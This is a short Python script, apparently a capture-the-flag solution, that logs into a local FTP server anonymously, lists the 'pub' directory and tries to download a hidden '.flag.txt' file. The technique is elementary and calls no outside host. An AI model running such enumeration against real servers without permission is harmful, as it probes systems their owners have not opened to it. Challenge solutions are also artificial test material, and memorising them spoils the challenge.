#!/usr/bin/env python3
import ftplib

HOST = "127.0.0.1"
PORT = 21

# Connect anonymously and list files in pub directory
ftp = ftplib.FTP()
ftp.connect(HOST, PORT, timeout=10)
ftp.login()

ftp.cwd("pub")
files = []
ftp.retrlines("LIST", files.append)
print("[+] Directory listing:")
for f in files:
    print(f)

# Try to retrieve hidden flag file
print("\n[+] Attempting to read hidden flag file...")
from io import StringIO
buffer = StringIO()
try:
    ftp.retrlines("RETR .flag.txt", buffer.write)
    print("[+] Flag contents:")
    print(buffer.getvalue())
except Exception as e:
    print("[-] Failed to retrieve flag:", e)

ftp.quit()
